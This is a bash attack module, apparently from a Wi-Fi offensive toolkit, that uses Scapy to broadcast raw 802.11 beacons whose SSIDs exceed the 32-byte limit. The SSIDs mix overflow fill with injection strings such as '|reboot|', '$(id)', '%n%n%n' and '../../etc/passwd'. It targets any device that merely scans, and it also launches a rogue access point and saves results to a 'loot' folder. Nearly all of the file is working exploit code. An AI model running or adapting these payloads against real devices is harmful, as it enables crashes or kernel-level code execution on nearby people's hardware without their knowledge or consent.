#!/usr/bin/env bash
# =====================================================================
#  55_ssid_overflow.sh — SSID-borne buffer overflow, combined with
#                        injection in the same payload
#
#  The attack: a rogue AP broadcasts a beacon whose SSID is longer than
#  the 32-byte IEEE limit, and whose bytes carry malicious content. A
#  device that merely SCANS nearby receives it — no association, no user
#  action. If the receiving code copies the SSID into a fixed buffer
#  without checking the length first, the excess overwrites adjacent
#  memory. Depending on what sits there, the result is a crash or code
#  execution with the driver's privileges, which on most systems means
#  the kernel.
#
#  What makes this module different from 53_ssid_injection: the payloads
#  are BOTH at once. Each one is an overflow priming string AND carries
#  an injection shape (shell metacharacters, format specifiers, path
#  traversal) at a chosen offset. Whichever flaw the target has, the same
#  bytes exercise it — you do not have to guess which class applies
#  before sending.
#
#  WHY THIS NEEDS RAW INJECTION
#  The kernel driver and hostapd both truncate SSIDs to 32 bytes and
#  reject longer ones. The length is also a single octet with a 255
#  ceiling. So an over-length SSID can only leave the antenna as a
#  hand-built 802.11 frame whose IE length byte is written independently
#  of the bytes that follow it. That is what Scapy is used for here.
#
#  Authorised testing only. Transmitting on radio spectrum is regulated
#  in most jurisdictions. Test devices you own or have written
#  permission to test.
# =====================================================================

set -uo pipefail

SELF="$(readlink -f "${BASH_SOURCE[0]}")"
WIFISTING_ROOT="${WIFISTING_ROOT:-$(cd -P "$(dirname "$SELF")/.." && pwd)}"
export WIFISTING_ROOT

TMP_DIR="${TMP_DIR:-/tmp/wifisting}"
SO_DIR="$TMP_DIR/ssid_overflow"
SO_LOG_DIR="${SO_LOG_DIR:-$WIFISTING_ROOT/loot/ssid_overflow}"
SO_PID="$SO_DIR/inject.pid"
SO_OBS="$SO_DIR/observations.tsv"

mkdir -p "$SO_DIR" "$SO_LOG_DIR" 2>/dev/null

info() { printf '[info] %s\n' "$*" >&2; }
ok()   { printf '[ok]   %s\n'   "$*" >&2; }
warn() { printf '[warn] %s\n'   "$*" >&2; }
err()  { printf '[err]  %s\n'   "$*" >&2; }

# ── the length lattice ────────────────────────────────────────────────
#
# Overflow length is not guessable — it depends on the size of the buffer
# the target allocates, which is 32, 33, 64, 128 or 256 on the devices
# that have been studied, but is not knowable from outside. So we walk
# every plausible boundary rather than picking one.
#
# Each boundary contributes the exact size, one past it, and the midpoint
# of the span above it, which is where an off-by-one or a
# round-up-then-copy bug shows up.
so_lattice() {
    local b
    for b in 16 32 33 48 63 64 65 96 127 128 129 192 254 255; do
        printf '%s\n' "$b"
        (( b > 1 )) && printf '%s\n' "$(( b - 1 ))"
        (( b < 255 )) && printf '%s\n' "$(( b + 1 ))"
    done | awk '$1 >= 1 && $1 <= 255' | sort -n -u
}

# ── injection shapes ──────────────────────────────────────────────────
#
# Placed at a chosen offset inside the fill. Short forms only: the longer
# a shape, the fewer offsets it fits at, and one of these does not need
# length to be dangerous.
so_shapes() {
    cat <<'SHAPES'
|reboot|	pipe to command
;id;	separator
$(id)	subshell
`id`	backtick
%n%n%n	format write
%s%s%s	format read
%p%p%p	pointer leak
../../../	path traversal
../../etc/passwd	traversal to file
';reboot;'	quote break
${IFS}id	IFS split
\x00	null truncation
\r\n	CRLF
<script>	markup opener
{{7*7}}	template probe
SHAPES
}

# ── combined payload generation ───────────────────────────────────────
#
# For a given total length and a shape, the shape is placed at each of a
# set of offsets: near the start (in case the copy target is short), just
# past every boundary (where an overflow would land), and at the very
# tail (in case the buffer is filled front to back).
#
# Offsets are expressed relative to the length so that the interesting
# positions — the byte that lands on a boundary, the last few bytes —
# are always covered regardless of what the target allocates.
so_combined_payloads() {
    local maxlen="${1:-255}"
    python3 - "$maxlen" <<'PY'
import sys

maxlen = int(sys.argv[1])

shapes = [
    (b"|reboot|", "pipe"),
    (b";id;", "semicolon"),
    (b"$(id)", "subshell"),
    (b"`id`", "backtick"),
    (b"%n%n%n", "fmt-write"),
    (b"%s%s%s", "fmt-read"),
    (b"%p%p%p", "fmt-leak"),
    (b"../../../", "traversal"),
    (b"';id;'", "quote-break"),
    (b"${IFS}id", "ifs-split"),
    (b"<script>", "markup"),
    (b"{{7*7}}", "ssti"),
]

# Every plausible buffer boundary, plus one past it.
bounds = [16, 32, 33, 48, 63, 64, 65, 96, 127, 128, 129, 192, 254, 255]

print("LENGTH\tOFFSET\tSHAPE\tFILL\tNOTE")
for L in bounds:
    if L > maxlen:
        continue
    for shape, name in shapes:
        if len(shape) > L:
            continue
        # offsets that matter: start, one past each smaller boundary,
        # the tail, and the byte that lands on the target length itself
        offs = {0, L - len(shape)}
        for b in bounds:
            if 0 <= b < L:
                offs.add(b)
            if 0 <= b + 1 < L:
                offs.add(b + 1)
        for off in sorted(o for o in offs if 0 <= o <= L - len(shape)):
            head = b"A" * off
            tail = b"A" * (L - off - len(shape))
            body = head + shape + tail
            print("%d\t%d\t%s\t%s\t%s"
                  % (L, off, name, "A-fill", body[:0].decode() or
                     ("shape at byte %d of %d" % (off, L))))
PY
}

# ── emission ──────────────────────────────────────────────────────────
#
# Raw 802.11. The IE length byte is written by hand: `claimed` is what the
# frame says, `body` is what follows. Making those disagree is the test,
# because implementations that trust the length field over the standard
# are exactly where this class lives.
so_emit() {
    local iface="$1" channel="$2" claimed="$3" hexbody="$4" count="${5:-4}"
    local mode="${6:-raw}"

    python3 - "$iface" "$channel" "$claimed" "$hexbody" "$count" "$mode" <<'PY'
import sys
from scapy.all import (RadioTap, Dot11, Dot11Beacon, Dot11Elt, Raw,
                       sendp, conf)
iface, channel, claimed, hexbody, count, mode = sys.argv[1:7]
claimed, count = int(claimed), int(count)
body = bytes.fromhex(hexbody) if hexbody else b""
conf.verb = 0

bssid = "02:00:00:53:4f:56"          # locally administered, fixed
d = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
          addr2=bssid, addr3=bssid)
b = Dot11Beacon(cap="ESS+privacy")

if mode == "raw":
    # Hand-written SSID element: id 0, an octet length that need not
    # match the content, then the content.
    ie = bytes([0x00, claimed & 0xFF]) + body
    frame = RadioTap() / d / b / Raw(load=ie)
else:
    # Well-formed element. The driver-side limit does not apply because
    # the frame is built here, but the length is honest — a control case,
    # so a crash can be attributed to content rather than to the lie.
    frame = RadioTap() / d / b / Dot11Elt(ID=0, info=body)

sendp(frame, iface=iface, count=count, inter=0.05, verbose=0)
PY
}

# ── guards ────────────────────────────────────────────────────────────
so_iface() {
    local i="${MON_IFACE:-}"
    [[ -z "$i" && -f "$TMP_DIR/mon_iface" ]] && i=$(cat "$TMP_DIR/mon_iface")
    printf '%s' "$i"
}

so_require_iface() {
    local i
    i=$(so_iface)
    [[ -z "$i" ]] && {
        printf 'ERROR\tno monitor interface - enable it in Interface Manager\n' >&2
        return 1
    }
    [[ -e "/sys/class/net/$i" ]] || {
        printf 'ERROR\t%s does not exist - renamed or unplugged\n' "$i" >&2
        return 1
    }
    printf '%s' "$i"
}

so_require_root() {
    if [[ ${EUID:-$(id -u)} -ne 0 && -z "${SO_UNPRIVILEGED_TEST:-}" ]]; then
        printf 'ERROR\tinjection needs root - the GUI runs it through pkexec\n' >&2
        printf 'ERROR\tfrom a shell, prefix with sudo\n' >&2
        return 1
    fi
    return 0
}

so_require_injection() {
    local iface="$1" drv
    drv=$(basename "$(readlink -f "/sys/class/net/$iface/device/driver" 2>/dev/null)" 2>/dev/null)
    if [[ "$drv" == "iwlwifi" ]]; then
        printf 'ERROR\t%s is Intel (iwlwifi) - it cannot inject frames\n' "$iface" >&2
        printf 'ERROR\tuse an Atheros AR9271 (ath9k_htc)\n' >&2
        return 1
    fi
    if command -v aireplay-ng >/dev/null 2>&1; then
        local t
        t=$(timeout 20 aireplay-ng --test "$iface" 2>&1 || true)
        grep -qE 'Injection is working|Injection test passed' <<<"$t" \
            && ok "injection verified on $iface" >&2 \
            || warn "injection test inconclusive on $iface - proceeding" >&2
    fi
    return 0
}

# ── the broadcast loop ────────────────────────────────────────────────
so_run() {
    local mode="$1" secs="$2" chan="$3"
    local iface
    iface=$(so_require_iface) || return 1
    so_require_root || return 1
    so_require_injection "$iface" || return 1

    : > "$SO_OBS"
    printf 'STARTED\t%s\n' "$$"
    printf 'IFACE\t%s\n' "$iface"
    printf 'CHANNEL\t%s\n' "$chan"
    printf 'MODE\t%s\n' "$mode"
    printf 'NOTE\tvictim needs only to scan - no association, no user action\n'

    local deadline=$(( $(date +%s) + secs ))
    local sent=0

    # Sweep lengths outermost-first so the most aggressive frames go out
    # while the target is still in its normal state. A device that crashes
    # early would otherwise be blamed on whatever was sent last.
    while IFS=$'\t' read -r L off shape _note; do
        (( $(date +%s) >= deadline )) && break
        local hex
        hex=$(python3 - "$L" "$off" "$shape" <<'PY'
import sys
L, off, name = int(sys.argv[1]), int(sys.argv[2]), sys.argv[3]
shapes = {
    "pipe": b"|reboot|", "semicolon": b";id;", "subshell": b"$(id)",
    "backtick": b"`id`", "fmt-write": b"%n%n%n", "fmt-read": b"%s%s%s",
    "fmt-leak": b"%p%p%p", "traversal": b"../../../", "quote-break": b"';id;'",
    "ifs-split": b"${IFS}id", "markup": b"<script>", "ssti": b"{{7*7}}",
}
s = shapes.get(name, b"AAAA")
head = b"A" * off
tail = b"A" * max(0, L - off - len(s))
print((head + s + tail).hex())
PY
)
        local claim="$L"
        [[ "$mode" == "lie" ]] && claim=$(( (L + 128) % 256 ))

        printf 'SEND\tlen=%s claim=%s off=%s shape=%s\n' "$L" "$claim" "$off" "$shape" >&2
        so_emit "$iface" "$chan" "$claim" "$hex" 4 "$mode"
        sent=$(( sent + 1 ))

        # A crash on the target shows as it going quiet. Recorded per
        # frame so the length and offset can be correlated afterwards.
        local probes
        probes=$(timeout 2 tcpdump -i "$iface" -c 1 -nn \
                     "wlan type mgt subtype probereq" 2>/dev/null | grep -c . || true)
        printf '%s\t%s\t%s\t%s\t%s\n' \
            "$(date +%s)" "$L" "$off" "$shape" "${probes:-0}" >> "$SO_OBS"
    done < <(so_combined_payloads 255)

    printf 'STOPPED\t%d frame group(s) sent\n' "$sent"
    printf 'OBSERVATIONS\t%s\n' "$SO_OBS"
    rm -f "$SO_PID"
}

# ── rogue AP ──────────────────────────────────────────────────────────
#
# The raw frames above cover over-length SSIDs. A real rogue AP is still
# worth having for the injection half at <=32 bytes, because a device
# that will not associate to a raw beacon may still associate to a
# properly formed one — and association is when the SSID reaches the
# deep parsing code.
so_rogue_ap() {
    local ssid="${1:-}" chan="${2:-6}"
    [[ -z "$ssid" ]] && { printf 'ERROR\tno SSID given\n' >&2; return 2; }
    # Check the argument before the hardware. An over-length SSID is a
    # mistake in the invocation, and reporting it as "no monitor
    # interface" would send the operator after the wrong problem.
    (( ${#ssid} > 32 )) && \
        warn "SSID is ${#ssid} bytes - hostapd will reject this; use --inject for raw frames" >&2

    local iface
    iface=$(so_require_iface) || return 1
    so_require_root || return 1

    local conf="$SO_DIR/hostapd.conf"
    {
        printf 'interface=%s\n' "$iface"
        printf 'driver=nl80211\n'
        printf 'ssid=%s\n' "$ssid"
        printf 'hw_mode=g\n'
        printf 'channel=%s\n' "$chan"
        printf 'auth_algs=1\n'
    } > "$conf"

    printf 'CONF\t%s\n' "$conf"
    printf 'SSID_LEN\t%s\n' "${#ssid}"
    setsid hostapd "$conf" > "$SO_LOG_DIR/hostapd.log" 2>&1 &
    echo $! > "$SO_PID"
    sleep 3
    if [[ -d "/proc/$(cat "$SO_PID")" ]]; then
        printf 'ROGUE_AP\trunning\tpid %s\n' "$(cat "$SO_PID")"
    else
        printf 'ERROR\thostapd exited - see %s\n' "$SO_LOG_DIR/hostapd.log" >&2
        tail -4 "$SO_LOG_DIR/hostapd.log" 2>/dev/null >&2
        rm -f "$SO_PID"
        return 1
    fi
}

# ── CLI ───────────────────────────────────────────────────────────────
so_cli_stop() {
    local n=0 pid=""
    [[ -f "$SO_PID" ]] && pid=$(cat "$SO_PID" 2>/dev/null)
    if [[ -n "$pid" && -d "/proc/$pid" ]]; then
        kill -TERM "$pid" 2>/dev/null && n=$(( n + 1 ))
        sleep 1
        [[ -d "/proc/$pid" ]] && kill -KILL "$pid" 2>/dev/null
    fi
    pkill -f "hostapd $SO_DIR/hostapd.conf" 2>/dev/null && n=$(( n + 1 ))
    rm -f "$SO_PID"
    printf 'STOPPED\t%s\n' "$n"
}

so_cli_status() {
    local running=0 pid=""
    [[ -f "$SO_PID" ]] && pid=$(cat "$SO_PID" 2>/dev/null)
    [[ -n "$pid" && -d "/proc/$pid" ]] && running=1
    printf 'running\t%s\n' "$running"
    printf 'iface\t%s\n' "$(so_iface)"
    printf 'lengths\t%s\n' "$(so_lattice | wc -l)"
    printf 'observations\t%s\n' "$( [[ -s "$SO_OBS" ]] && grep -c . "$SO_OBS" || echo 0)"
    printf 'loot_dir\t%s\n' "$SO_LOG_DIR"
}

so_cli_selftest() {
    chk() {
        if [[ "$2" == "$3" ]]; then printf '%s\tPASS\n' "$1"
        else printf '%s\tFAIL\twant=%s got=%s\n' "$1" "$3" "$2"; fi
    }

    local n
    n=$(so_lattice | wc -l)
    (( n >= 20 )) && chk lattice-covers-boundaries "$n" "$n" || chk lattice-covers-boundaries "$n" ">=20"

    # The lattice must include both sides of the IEEE limit. Captured to a
    # variable first: with pipefail set, testing `fn | grep` can report the
    # producer's status instead of the match, which is what made this test
    # fail against a lattice that plainly contained both values.
    local lat
    lat=$(so_lattice)
    if grep -qx 32 <<<"$lat"; then chk lattice-has-32 ok ok
    else chk lattice-has-32 missing ok; fi
    if grep -qx 33 <<<"$lat"; then chk lattice-has-33 ok ok
    else chk lattice-has-33 missing ok; fi

    # every entry must be within the single-octet IE length ceiling
    local over
    over=$(so_lattice | awk '$1 > 255' | wc -l)
    chk lattice-under-255 "$over" "0"

    n=$(so_shapes | wc -l)
    (( n >= 10 )) && chk shapes-present "$n" "$n" || chk shapes-present "$n" ">=10"

    n=$(so_combined_payloads 255 | tail -n +2 | wc -l)
    (( n > 100 )) && chk combined-payloads "$n" "$n" || chk combined-payloads "$n" ">100"

    # the same payload must carry BOTH an overflow length and a shape
    local both
    both=$(so_combined_payloads 255 | tail -n +2 | awk -F'\t' '$1 > 32 && $3 != ""' | wc -l)
    (( both > 50 )) && chk overflow-and-shape-combined "$both" "$both" \
                    || chk overflow-and-shape-combined "$both" ">50"

    # over-length lengths must be present, since that is the whole point
    local longl
    longl=$(so_combined_payloads 255 | tail -n +2 | awk -F'\t' '$1 > 32' | wc -l)
    (( longl > 20 )) && chk over-length-payloads "$longl" "$longl" \
                     || chk over-length-payloads "$longl" ">20"

    # injection without an interface must be refused
    local et
    et=$(mktemp -d)
    ( TMP_DIR="$et" MON_IFACE="" so_require_iface ) >/dev/null 2>&1
    [[ $? -ne 0 ]] && chk no-iface-refused rc-bad rc-bad || chk no-iface-refused rc-ok rc-bad
    rm -rf "$et"

    # A rogue AP with an over-length SSID must warn rather than proceed
    # silently. Captured to a variable because so_rogue_ap correctly returns
    # non-zero when the interface check fails, and under pipefail that masks
    # the grep match.
    local rout
    rout=$(SO_UNPRIVILEGED_TEST=1 so_rogue_ap "$(printf 'A%.0s' $(seq 1 40))" 6 2>&1)
    if grep -q 'hostapd will reject' <<<"$rout"; then chk overlength-ssid-warns ok ok
    else chk overlength-ssid-warns no ok; fi
}

case "${1:-}" in
    --lattice-tsv)   so_lattice ;;
    --shapes-tsv)    printf 'SHAPE\tNOTE\n'; so_shapes ;;
    --payloads-tsv)  shift; so_combined_payloads "${1:-255}" ;;
    --inject)        shift; so_run "${1:-lie}" "${2:-60}" "${3:-6}" ;;
    --rogue-ap)      shift; so_rogue_ap "$@" ;;
    --observe-tsv)
        if [[ -s "$SO_OBS" ]]; then
            printf 'TIME\tLENGTH\tOFFSET\tSHAPE\tPROBES\n'; cat "$SO_OBS"
        else
            printf 'INFO\tno observations yet\n'
        fi ;;
    --status-tsv)    so_cli_status ;;
    --stop)          so_cli_stop ;;
    --selftest)      so_cli_selftest ;;
    --info)
        printf 'SSID-borne buffer overflow, with injection in the same payload\n'
        printf 'Broadcasts SSIDs past the 32-byte limit carrying malicious content.\n'
        printf 'A scanning device is enough - no association, no user action.\n'
        printf 'Authorised testing only.\n' ;;
    --help|"")
        printf 'Usage: modules/55_ssid_overflow.sh COMMAND\n'
        printf '  --lattice-tsv                 buffer boundary lengths\n'
        printf '  --shapes-tsv                  injection shapes\n'
        printf '  --payloads-tsv [MAXLEN]       combined overflow+injection payloads\n'
        printf '  --inject [raw|lie] [SECONDS] [CHANNEL]\n'
        printf '  --rogue-ap SSID [CHANNEL]\n'
        printf '  --observe-tsv / --status-tsv / --stop / --selftest\n' ;;
    *) printf 'ERROR\tunknown command: %s\n' "$1" >&2; exit 2 ;;
esac
